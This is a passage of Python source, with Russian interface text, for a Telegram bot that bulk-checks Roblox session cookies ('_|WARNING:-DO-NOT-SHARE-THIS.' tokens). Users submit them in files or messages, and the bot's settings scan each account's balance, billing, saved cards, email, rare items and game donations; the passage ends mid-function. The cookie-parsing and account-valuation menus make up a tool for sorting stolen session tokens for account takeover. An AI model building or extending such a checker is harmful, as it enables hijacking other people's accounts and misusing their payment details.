        'FiveNightsTD', 'GrandPieceOnline', 'GrowaGarden', 'Jailbreak', 'JujutsuInfinite',
        'KingLegacy', 'MurderMystery2', 'PetSimulator99', 'PETSGO', 'ProjectSlayers',
        'Rivals', 'RoyalHigh', 'SolsRNG', 'StealaBrainrot', 'ToiletTowerDefense',
        'TowerDefenseSimulator', 'YourBizarreAdventure'
    ]
    
    # Пагинация (по 3 игры на странице)
    games_per_page = 3
    page_index = 0
    await state.update_data(games_page_index=page_index)
    
    total_pages = (len(games_list) + games_per_page - 1) // games_per_page
    start_idx = page_index * games_per_page
    end_idx = start_idx + games_per_page
    current_games = games_list[start_idx:end_idx]
    
    keyboard_rows = []
    
    # Добавляем игры на текущей странице
    for game_name in current_games:
        keyboard_rows.append([InlineKeyboardButton(text=game_name, callback_data=f"select_one_game_{game_name}")])
    
    # Пагинация кнопки
    pagination_row = []
    if page_index > 0:
        pagination_row.append(InlineKeyboardButton(text="⬅️", callback_data="games_page_prev"))
    
    if page_index < total_pages - 1:
        pagination_row.append(InlineKeyboardButton(text="➡️", callback_data="games_page_next"))
    
    if pagination_row:
        keyboard_rows.append(pagination_row)
    
    # Кнопка Назад
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    await message.answer(
        f"🎮 <b>ВЫБОР ИГРЫ ДЛЯ ПРОВЕРКИ</b>\n\n"
        f"<i>Выберите игру из списка</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.message(Command("ban"))
async def ban_user_command(message: Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ <b>У вас нет прав для выполнения этой команды</b>", parse_mode=ParseMode.HTML)
        return
    
    try:
        args = message.text.split()
        if len(args) < 3:
            await message.answer(
                f"❌ <b>НЕВЕРНЫЙ ФОРМАТ КОМАНДЫ</b>\n"
                f"\n"
                f"📝 <b>Используйте:</b>\n"
                f"<code>/ban @username или ID причина бана</code>\n\n"
                f"📋 <b>Пример:</b>\n"
                f"<code>/ban 12345678 Нарушение правил</code>\n\n"
                f"⚠️ <b>Бот автоматически уведомит пользователя о бане</b>",
                parse_mode=ParseMode.HTML
            )
            return
        
        target = args[1].strip('@')
        reason = " ".join(args[2:])
        
        user_id = None
        username = "Неизвестно"
        
        if target.isdigit():
            user_id = int(target)
            for user in Database.get_all_users():
                config = Database.get_user_config(user)
                if user == user_id:
                    username = config.get('username', 'Неизвестно')
                    break
        else:

            for user in Database.get_all_users():
                config = Database.get_user_config(user)
                if config.get('username') == target:
                    user_id = user
                    username = target
                    break
        
        if not user_id:
            await message.answer(f"❌ <b>Пользователь @{target} не найден в базе.</b>", parse_mode=ParseMode.HTML)
            return
        
        Database.ban_user(user_id, reason)

        try:
            await bot.send_sticker(user_id, STICKERS['ban'])
            await bot.send_message(
                user_id,
                f"🚫 <b>ВЫ БЫЛИ ЗАБЛОКИРОВАНЫ</b>\n"
                f"\n"
                f"📝 <b>Причина блокировки:</b>\n<code>{reason}</code>\n\n"
                f"⏳ <b>Срок блокировки:</b> Навсегда\n\n"
                f"⚠️ <b>Вы больше не сможете использовать бота.</b>\n",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logging.error(f"Не удалось уведомить пользователя {user_id} о бане: {e}")
        
        await message.answer(
            f"✅ <b>Пользователь заблокирован</b>\n\n"
            f"👤 <b>Пользователь:</b> @{username}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
            f"📝 <b>Причина:</b> <code>{reason}</code>\n"
            f"📅 <b>Дата:</b> <code>{date.today()}</code>",
            parse_mode=ParseMode.HTML
        )
        
        await log_to_admin(f"Заблокировал пользователя @{username} (ID: {user_id})", message.from_user.id, message.from_user.username)
        
    except Exception as e:
        await message.answer(
            f"❌ <b>Ошибка при бане пользователя:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )
    
@router.message(Command("unban"))
async def unban_user_command(message: Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ <b>У вас нет прав для выполнения этой команды</b>", parse_mode=ParseMode.HTML)
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            await message.answer(
                f"❌ <b>НЕВЕРНЫЙ ФОРМАТ КОМАНДЫ</b>\n"
                f"\n"
                f"📝 <b>Используйте:</b>\n"
                f"<code>/unban @username или ID</code>\n\n"
                f"📋 <b>Пример:</b>\n"
                f"<code>/unban 12345678</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        target = args[1].strip('@')
        
        user_id = None
        
        if target.isdigit():
            user_id = int(target)
        else:
            banned_users = Database.load_banned_users()
            for banned_id in banned_users.keys():
                if str(banned_id) == target:  # username 
                    user_id = int(banned_id)
                    break
        
        if not user_id:
            await message.answer(f"❌ <b>Пользователь @{target} не найден в заблокированных.</b>", parse_mode=ParseMode.HTML)
            return
        
        if not Database.is_user_banned(user_id):
            await message.answer(f"⚠️ <b>Пользователь @{target} не заблокирован.</b>", parse_mode=ParseMode.HTML)
            return
        
        Database.unban_user(user_id)
        
        try:
            await bot.send_message(
                user_id,
                f"✅ <b>ВАША БЛОКИРОВКА СНЯТА</b>\n"
                f"\n"
                f"🎉 <b>Вы снова можете использовать бота!</b>\n\n"
                f"⚠️ <b>Пожалуйста, соблюдайте правила использования.</b>",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logging.error(f"Не удалось уведомить пользователя {user_id} о разбане: {e}")
        
        await message.answer(
            f"✅ <b>Пользователь разблокирован</b>\n\n"
            f"👤 <b>Пользователь:</b> ID <code>{user_id}</code>\n"
            f"📅 <b>Дата:</b> <code>{date.today()}</code>",
            parse_mode=ParseMode.HTML
        )
        
        await log_to_admin(f"Разблокировал пользователя ID: {user_id}", message.from_user.id, message.from_user.username)
        
    except Exception as e:
        await message.answer(
            f"❌ <b>Ошибка при разбане пользователя:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

@router.callback_query(F.data == "check_settings_menu")
async def check_settings_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(user_id)
    check_params = config.get('check_params', DEFAULT_CHECK_PARAMS)
    
    keyboard_rows = []
    
    categories = [
        {
            'params': [
                ('Баланс', 'balance'),
                ('Пендинг', 'pending'),
                ('Донат (год)', 'donate_year'),
                ('Донат (всё время)', 'donate_all_time'),
                ('RAP', 'rap')
            ]
        },
        {
            'params': [
                ('Биллинг', 'billing'),
                ('Карты', 'cards'),
                ('Премиум', 'premium'),
                ('Почта', 'email'),
                ('Country', 'country')
            ]
        },
        {
            'params': [
                ('Бейджи', 'badges'),
                ('По именам бейджей', 'badges_by_name'),
                ('Геймпассы', 'gamepasses'),
                ('По именам геймпассов', 'gamepasses_by_name'),
                ('Редкие (Korblox/Headless)', 'rare_items')
            ]
        },
        {
            'params': [
                ('InGame Donate', 'ingame_donate'),
                ('Playtime', 'playtime'),
                ('Баланс групп', 'group_balance'),
                ('Визиты плейсов', 'place_visits')
            ]
        }
    ]
    for category in categories:
        for param_name, param_key in category['params']:
            is_enabled = check_params.get(param_key, False)
            emoji = "✅" if is_enabled else "❌"
            callback_data = f"toggle_param_{param_key}"
            keyboard_rows.append([InlineKeyboardButton(text=f"   {emoji} {param_name}", callback_data=callback_data)])

    keyboard_rows.append([InlineKeyboardButton(text="📁 Параметры вывода", callback_data="output_format_menu")])
    keyboard_rows.append([InlineKeyboardButton(text="⏱ Параметры Playtime", callback_data="playtime_settings_menu")])
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_check_params")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    await callback.message.edit_text(
        f"⚙️ <b>НАСТРОЙКИ ЧЕКА</b>\n\n"
        f"Категории параметров сканирования:\n\n"
        f"<i>Нажмите на параметр чтобы включить/выключить</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "enable_all_params")
async def enable_all_params(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(user_id)
    check_params = config.get('check_params', DEFAULT_CHECK_PARAMS.copy())
    
    for param_key in check_params.keys():
        check_params[param_key] = True
    
    Database.update_config(user_id, 'check_params', check_params)
    
    await callback.answer("✅ Все параметры включены")

    await check_settings_menu(callback)

@router.callback_query(F.data == "disable_all_params")
async def disable_all_params(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(user_id)
    check_params = config.get('check_params', DEFAULT_CHECK_PARAMS.copy())
    
    for param_key in check_params.keys():
        check_params[param_key] = False
    
    Database.update_config(user_id, 'check_params', check_params)
    
    await callback.answer("❌ Все параметры выключены")
    
    await check_settings_menu(callback)

@router.callback_query(F.data == "no_action")
async def no_action_handler(callback: CallbackQuery):
    await callback.answer("📁 Категория параметров", show_alert=False)

@router.callback_query(F.data.startswith("toggle_param_"))
async def toggle_check_param(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Прицена: {reason}", show_alert=True)
        return
    
    param_key = callback.data.split("toggle_param_")[1]
    config = Database.get_user_config(user_id)
    check_params = config.get('check_params', DEFAULT_CHECK_PARAMS.copy())
    
    current_value = check_params.get(param_key, False)
    new_value = not current_value
    
    Database.update_check_param(user_id, param_key, new_value)
    
    await callback.answer(f"Параметр обновлен: {new_value}")
    
    message_text = callback.message.text or ""
    
    if "НАСТРОЙКИ ЧЕКА" in message_text:
        await check_settings_menu(callback)
    else:

        await back_to_check_params(callback)

@router.message(F.text == "⚙️ Настройки чека")
async def quick_check_settings(message: Message):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    

    from aiogram.types import CallbackQuery
    callback = types.CallbackQuery(
        id="0",
        from_user=message.from_user,
        chat_instance="0",
        message=types.Message(
            message_id=message.message_id,
            date=message.date,
            chat=message.chat,
            from_user=message.from_user
        ),
        data="check_settings_menu"
    )
    
    await check_settings_menu(callback)

@router.callback_query(F.data.startswith("toggle_param_"))
async def toggle_check_param(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    param_key = callback.data.split("toggle_param_")[1]
    config = Database.get_user_config(user_id)
    check_params = config.get('check_params', DEFAULT_CHECK_PARAMS.copy())
    
    current_value = check_params.get(param_key, False)
    new_value = not current_value
    
    Database.update_check_param(user_id, param_key, new_value)
    
    await callback.answer(f"Параметр обновлен: {new_value}")
    
    config = Database.get_user_config(user_id)
    check_params = config.get('check_params', DEFAULT_CHECK_PARAMS)
    
    keyboard_rows = []
    params_list = [
        ('Баланс', 'balance'),
        ('Пендинг', 'pending'),
        ('По именам бейджей (вместо кол-ва)', 'badges_by_name'),
        ('По именам геймпассов (вместо кол-ва)', 'gamepasses_by_name'),
        ('Донат (год)', 'donate_year'),
        ('Донат (всё время)', 'donate_all_time'),
        ('InGame Donate', 'ingame_donate'),
        ('Playtime', 'playtime'),
        ('RAP', 'rap'),
        ('Биллинг', 'billing'),
        ('Карты', 'cards'),
        ('Премиум', 'premium'),
        ('Почта', 'email'),
        ('Редкие (Korblox/Headless)', 'rare_items'),
        ('Бейджи', 'badges'),
        ('Геймпассы', 'gamepasses'),
        ('Баланс групп', 'group_balance'),
        ('Визиты плейсов', 'place_visits'),
        ('Country', 'country')
    ]
    
    for param_name, param_key_iter in params_list:
        is_enabled = check_params.get(param_key_iter, False)
        emoji = "✅" if is_enabled else "❌"
        callback_data = f"toggle_param_{param_key_iter}"
        keyboard_rows.append([InlineKeyboardButton(text=f"{emoji} {param_name}", callback_data=callback_data)])
    
    keyboard_rows.append([InlineKeyboardButton(text="📁 Проверить файл", callback_data="start_check_file")])
    keyboard_rows.append([InlineKeyboardButton(text="📝 Проверить сообщение", callback_data="start_check_message")])
    keyboard_rows.append([
        InlineKeyboardButton(text="🏅 Указать бэйджи", callback_data="set_badge"),
        InlineKeyboardButton(text="🎮 Указать геймпассы", callback_data="set_gp")
    ])
    keyboard_rows.append([InlineKeyboardButton(text="📁 Параметры вывода", callback_data="output_format_menu")])
    keyboard_rows.append([InlineKeyboardButton(text="🎮 Параметры игр", callback_data="game_settings_menu")])
    keyboard_rows.append([InlineKeyboardButton(text="⏱ Параметры Playtime", callback_data="playtime_settings_menu")])
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_cookie_check")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    try:
        await callback.message.edit_reply_markup(reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Ошибка обновления клавиатуры: {e}")

@router.callback_query(F.data == "output_format_menu")
async def output_format_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(user_id)
    output_format = config.get('output_format', DEFAULT_OUTPUT_FORMAT.copy())
    
    zip_enabled = output_format.get('zip', True)
    txt_enabled = output_format.get('txt', False)
    
    current_format = "ZIP" if zip_enabled else "TXT"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ ZIP архив", 
                              callback_data="select_zip")],
        [InlineKeyboardButton(text=f"❌ TXT файлы", 
                              callback_data="select_txt")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_check_params")]
    ])
    
    await callback.message.edit_text(
        f"📁 <b>ВЫБОР ФОРМАТА ВЫВОДА</b>\n\n"
        f"📊 <b>Текущий формат:</b> <code>{current_format}</code>\n\n"
        f"Выберите один из вариантов:\n\n"
        f"<i>При выборе нового формата предыдущий автоматически отключится</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "select_zip")
async def select_zip_format(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    output_format = {
        'zip': True,
        'txt': False
    }
    
    Database.update_config(user_id, 'output_format', output_format)
    
    await callback.answer("✅ Выбран формат: ZIP архив")
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ ZIP архив", 
                              callback_data="select_zip")],
        [InlineKeyboardButton(text=f"❌ TXT файлы", 
                              callback_data="select_txt")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_check_params")]
    ])
    
    try:
        await callback.message.edit_reply_markup(reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Ошибка обновления клавиатуры: {e}")

@router.callback_query(F.data == "select_txt")
async def select_txt_format(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    output_format = {
        'zip': False,
        'txt': True
    }
    
    Database.update_config(user_id, 'output_format', output_format)
    
    await callback.answer("✅ Выбран формат: TXT файлы")
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"❌ ZIP архив", 
                              callback_data="select_zip")],
        [InlineKeyboardButton(text=f"✅ TXT файлы", 
                              callback_data="select_txt")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_check_params")]
    ])
    
    try:
        await callback.message.edit_reply_markup(reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Ошибка обновления клавиатуры: {e}")

@router.callback_query(F.data == "game_settings_menu")
async def game_settings_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(user_id)
    game_settings = config.get('game_settings', DEFAULT_GAME_SETTINGS.copy())
    
    keyboard_rows = []
    games_list = [
        ('Steal a Brainrot', 'Steal a Brainrot'),
        ('Grow a Garden', 'Grow a Garden'),
        ('Adopt Me', 'Adopt Me'),
        ('Blade Ball', 'Blade Ball'),
        ('PS99', 'PS99'),
        ('MM2', 'MM2'),
        ('BSS', 'BSS'),
        ('Jailbreak', 'Jailbreak'),
        ('Blox Fruits', 'Blox Fruits')
    ]
    
    for game_display_name, game_key in games_list:
        game_data = game_settings.get(game_key, {'enabled': False, 'game_id': 0})
        is_enabled = game_data.get('enabled', False)
        emoji = "✅" if is_enabled else "❌"
        callback_data = f"toggle_game_{game_key}"
        keyboard_rows.append([InlineKeyboardButton(text=f"{emoji} {game_display_name}", callback_data=callback_data)])
    
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_check_params")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    await callback.message.edit_text(
        f"🎮 <b>In-Game Donations</b>\n\n"
        f"Выберите игры для сканирования:\n\n"
        f"<i>Нажмите на игру чтобы включить/выключить</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data.startswith("toggle_game_") & ~F.data.startswith("toggle_game_badge_") & ~F.data.startswith("toggle_game_gp_"))
async def toggle_game_setting(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    game_key = callback.data.split("toggle_game_")[1]
    config = Database.get_user_config(user_id)
    game_settings = config.get('game_settings', DEFAULT_GAME_SETTINGS.copy())
    
    game_data = game_settings.get(game_key, {'enabled': False, 'game_id': 0})
    current_value = game_data.get('enabled', False)
    new_value = not current_value
    
    Database.update_game_setting(user_id, game_key, new_value)
    
    await callback.answer(f"Игра {game_key}: {'включена' if new_value else 'выключена'}")
    
    config = Database.get_user_config(user_id)
    game_settings = config.get('game_settings', DEFAULT_GAME_SETTINGS.copy())
    
    keyboard_rows = []
    games_list = [
        ('Steal a Brainrot', 'Steal a Brainrot'),
        ('Grow a Garden', 'Grow a Garden'),
        ('Adopt Me', 'Adopt Me'),
        ('Blade Ball', 'Blade Ball'),
        ('PS99', 'PS99'),
        ('MM2', 'MM2'),
        ('BSS', 'BSS'),
        ('Jailbreak', 'Jailbreak'),
        ('Blox Fruits', 'Blox Fruits')
    ]
    
    for game_display_name, game_key_iter in games_list:
        game_data = game_settings.get(game_key_iter, {'enabled': False, 'game_id': 0})
        is_enabled = game_data.get('enabled', False)
        emoji = "✅" if is_enabled else "❌"
        callback_data = f"toggle_game_{game_key_iter}"
        keyboard_rows.append([InlineKeyboardButton(text=f"{emoji} {game_display_name}", callback_data=callback_data)])
    
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_check_params")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    try:
        await callback.message.edit_reply_markup(reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Ошибка обновления клавиатуры: {e}")

@router.callback_query(F.data == "playtime_settings_menu")
async def playtime_settings_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(user_id)
    playtime_settings = config.get('playtime_settings', DEFAULT_PLAYTIME_SETTINGS.copy())
    
    keyboard_rows = []
    games_list = [
        ('Steal a Brainrot', 'Steal a Brainrot'),
        ('Grow a Garden', 'Grow a Garden'),
        ('Adopt Me', 'Adopt Me'),
        ('Blade Ball', 'Blade Ball'),
        ('PS99', 'PS99'),
        ('MM2', 'MM2'),
        ('BSS', 'BSS'),
        ('Jailbreak', 'Jailbreak'),
        ('Blox Fruits', 'Blox Fruits')
    ]
    
    for game_display_name, game_key in games_list:
        is_enabled = playtime_settings.get(game_key, False)
        emoji = "✅" if is_enabled else "❌"
        callback_data = f"toggle_playtime_{game_key}"
        keyboard_rows.append([InlineKeyboardButton(text=f"{emoji} {game_display_name}", callback_data=callback_data)])
    
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_check_params")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    await callback.message.edit_text(
        f"⏱ <b>Playtime Settings</b>\n\n"
        f"Выберите игры для сканирования времени игры:\n\n"
        f"<i>Нажмите на игру чтобы включить/выключить</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data.startswith("toggle_playtime_"))
async def toggle_playtime_setting(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    game_key = callback.data.split("toggle_playtime_")[1]
    config = Database.get_user_config(user_id)
    playtime_settings = config.get('playtime_settings', DEFAULT_PLAYTIME_SETTINGS.copy())
    
    current_value = playtime_settings.get(game_key, False)
    new_value = not current_value
    
    Database.update_playtime_setting(user_id, game_key, new_value)
    
    await callback.answer(f"Playtime для {game_key}: {'включен' if new_value else 'выключен'}")
    
    config = Database.get_user_config(user_id)
    playtime_settings = config.get('playtime_settings', DEFAULT_PLAYTIME_SETTINGS.copy())
    
    keyboard_rows = []
    games_list = [
        ('Steal a Brainrot', 'Steal a Brainrot'),
        ('Grow a Garden', 'Grow a Garden'),
        ('Adopt Me', 'Adopt Me'),
        ('Blade Ball', 'Blade Ball'),
        ('PS99', 'PS99'),
        ('MM2', 'MM2'),
        ('BSS', 'BSS'),
        ('Jailbreak', 'Jailbreak'),
        ('Blox Fruits', 'Blox Fruits')
    ]
    
    for game_display_name, game_key_iter in games_list:
        is_enabled = playtime_settings.get(game_key_iter, False)
        emoji = "✅" if is_enabled else "❌"
        callback_data = f"toggle_playtime_{game_key_iter}"
        keyboard_rows.append([InlineKeyboardButton(text=f"{emoji} {game_display_name}", callback_data=callback_data)])
    
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_check_params")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    try:
        await callback.message.edit_reply_markup(reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Ошибка обновления клавиатуры: {e}")

@router.callback_query(F.data == "back_to_check_params")
async def back_to_check_params(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    config = Database.get_user_config(user_id)
    keyboard_rows = []
    
    
    keyboard_rows.append([InlineKeyboardButton(text="⚙️ Настройки чека", callback_data="check_settings_menu")])
    keyboard_rows.append([InlineKeyboardButton(text="📁 Проверить файл", callback_data="start_check_file")])
    keyboard_rows.append([InlineKeyboardButton(text="📝 Проверить сообщение", callback_data="start_check_message")])
    keyboard_rows.append([
        InlineKeyboardButton(text="🏅 Указать бэйджи", callback_data="set_badge"),
        InlineKeyboardButton(text="🎮 Указать геймпассы", callback_data="set_gp")
    ])
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_cookie_check")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    await callback.message.edit_text(
        f"🔍 <b>Cookie Checker</b>\n"
        f"Выберите, что сканировать:\n\n"
        f"<i>Нажмите на параметр чтобы включить/выключить</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "start_check_file")
async def start_check_file(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_cookie_check")]
    ])
    
    await callback.message.answer(
        f"📋 <b>ИНСТРУКЦИЯ ПО ПРОВЕРКЕ ФАЙЛА</b>\n"
        f"\n"
        
        f"1. <b>Подготовьте файл с куками (.txt)</b>\n"
        f"2. <b>Отправьте файл в этот чат</b>\n\n"
        
        f"📁 <b>Требования к файлу:</b>\n"
        f"├ Формат: ТОЛЬКО TXT\n"
        f"├ Макс. размер: 20MB\n"
        f"└ Каждая печенька → новая строка\n\n"
        
        f"<i>«Жду ваш файл :3»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.file)

@router.callback_query(F.data == "start_check_message")
async def start_check_message(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_cookie_check")]
    ])
    
    await callback.message.answer(
        f"📝 <b>ИНСТРУКЦИЯ ПО ПРОВЕРКЕ СООБЩЕНИЯ</b>\n"
        f"\n"
        
        f"1. <b>Введите печеньку в чат</b>\n"
        f"2. <b>Или отправьте несколько куки, каждую с новой строки</b>\n\n"
        
        f"📋 <b>Формат:</b>\n"
        f"├ Одна печенька → одно сообщение\n"
        f"└ Несколько куки → каждую с новой строки\n\n"
        
        f"<i>«Отправьте печеньку для проверки»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.check_cookie)

@router.message(Form.check_cookie)
async def process_check_cookie_message(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    text = message.text.strip()
    if not text:
        await message.answer("❌ <b>Сообщение пустое.</b>\nОтправьте печеньку для проверки.", parse_mode=ParseMode.HTML)
        return
    
    msg = await message.answer("🔍 <b>Проверяю печеньку...</b>", parse_mode=ParseMode.HTML)
    
    try:
        cookies = []
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if '_|WARNING:-DO-NOT-SHARE-THIS.' in line:
                try:
                    cookie = line.split('_|WARNING:-DO-NOT-SHARE-THIS.')[1].split()[0]
                    full_cookie = f'_|WARNING:-DO-NOT-SHARE-THIS.{cookie}'
                    cookies.append(full_cookie)
                except:
                    pass
        
        if not cookies:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>ПРОВЕРКА СООБЩЕНИЯ</b>\n"
                f"\n"
                f"🚫 <b>В сообщении не найдено валидных куки.</b>\n\n"
                f"<i>Проверьте формат и попробуйте снова.</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        file_info = {
            'cookies': cookies,
            'total_lines': len(lines),
            'invalid_lines': len(lines) - len(cookies),
            'duplicates': 0
        }
        
        check_queue.put((message.from_user.id, file_info, msg))
        queue_size = check_queue.qsize()
        
        if current_checking is None:
            status_msg = (
                f"✅ <b>СООБЩЕНИЕ ДОБАВЛЕНО В ОЧЕРЕДЬ</b>\n"
                f"\n"
                f"📊 <b>Статистика:</b>\n"
                f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
                f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
                f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
                f"🎯 <b>Статус:</b> Первый в очереди\n"
                f"⏳ <b>Начало проверки:</b> Следующий\n\n"
                f"<i>Ожидайте начала проверки...</i>"
            )
        else:
            status_msg = (
                f"✅ <b>СООБЩЕНИЕ ДОБАВЛЕНО В ОЧЕРЕДЬ</b>\n"
                f"\n"
                f"📊 <b>Статистика:</b>\n"
                f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
                f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
                f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
                f"📍 <b>Позиция в очереди:</b> <code>{queue_size}</code>\n"
                f"⏱ <b>Примерное время ожидания:</b> <code>{queue_size * 2}-{queue_size * 5}</code> минут\n\n"
                f"<i>Статус очереди будет обновляться автоматически.</i>"
            )
        
        await msg.edit_text(status_msg, parse_mode=ParseMode.HTML)
        await notify_queue_update()
            
    except Exception as e:
        await bot.send_sticker(message.chat.id, STICKERS['error'])
        error_message = (
            f"❌ <b>ОШИБКА ОБРАБОТКИ СООБЩЕНИЯ</b>\n"
            f"\n"
            f"📝 <b>Произошла ошибка:</b>\n"
